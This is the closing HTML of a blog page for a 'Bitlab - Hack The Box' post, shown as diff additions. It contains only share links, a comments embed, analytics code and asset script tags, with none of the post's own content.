+            <a href="https://twitter.com/home?status=Bitlab+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/bitlab%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/bitlab" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
